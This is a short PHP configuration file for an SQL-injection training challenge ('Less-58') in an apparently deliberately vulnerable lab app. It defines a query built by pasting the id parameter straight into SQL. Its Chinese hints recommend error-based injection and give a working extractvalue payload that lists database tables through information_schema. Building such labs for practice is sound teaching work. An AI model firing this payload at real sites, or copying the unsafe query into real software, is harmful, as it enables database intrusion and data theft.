<?php
// Less-58 内部演练接口（挑战关）
if (!defined('SQLI_MALL')) { die('forbidden'); }
require_once __DIR__ . '/_series.php';
return series_def([
  'times' => 10, 'difficulty' => 4, 'error' => true,
  'sql' => 'SELECT id, title, content FROM oa_notice WHERE id=\'{id}\' LIMIT 0,1',
  'hints' => array (
  0 => '有报错回显——报错注入比盲注省次数，10 次限制下优先用报错。',
  1 => '单引号闭合 + extractvalue/updatexml。',
  2 => '示例：?id=1\' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\'challenges\'),0x7e))-- -',
),
]);
